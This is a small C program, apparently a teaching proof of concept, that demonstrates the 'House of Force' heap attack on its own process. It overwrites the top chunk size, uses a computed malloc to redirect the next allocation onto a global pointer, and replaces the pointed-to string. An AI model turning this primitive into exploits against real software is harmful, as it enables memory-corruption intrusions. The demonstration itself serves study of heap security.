#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

char* target = "Target!!!";
char* exploit = "EXPL0I7!!!!";

int main(int argc, char* argv[]){
    uint64_t* buf1, *buf2, *buf3;
    uint64_t* top_chunk_size;
    uint64_t* top_chunk;

    printf("==Before House of Force Attack==\n");
    printf("[+] Target ===> %s\n\n", target);
    printf("Target Addr: %p\n\n", &target);

    printf("1. malloc(128)\n");
    buf1 = malloc(128); // Memory Alloc

    top_chunk = &buf1[16];       // Top Chunk Addr
    top_chunk_size = &buf1[17];  // Top Chunk Size Addr

    printf("Top Chunk Addr: %p\n", top_chunk_size);
    printf("Top Chunk Size: 0x%lx\n\n", *top_chunk_size);

    /* Top Chunk Size Overwrite */
    printf("2. OverWrite Top Chunk Size\n");
    *top_chunk_size = 0xffffffffffffffff;
    printf("Top Chunk Addr: %p\n", top_chunk_size);
    printf("Top Chunk Size: 0x%lx\n\n", *top_chunk_size);

    /* Calculate Address to House of Force */
    uint64_t calc = (uint64_t)(&target) - 0x10 - (uint64_t)top_chunk - 0x18;
    printf("3. House of Force!!\n");

    printf("Calc : %lx\n", calc);
    printf("malloc(0x%lx)\n", calc);

    /* House of Force */
    buf2 = malloc(calc);
    printf("[+] buf2 addr: %p\n", buf2);

    /* One More Allocation */
    buf3 = malloc(128);
    printf("[+] buf3 addr: %p\n\n", buf3);

    buf3[1] = (uint64_t)exploit;

    printf("==After House of Force Attack==\n");
    printf("[+] Target ===> %s\n\n", target);
    
    return 0;
}
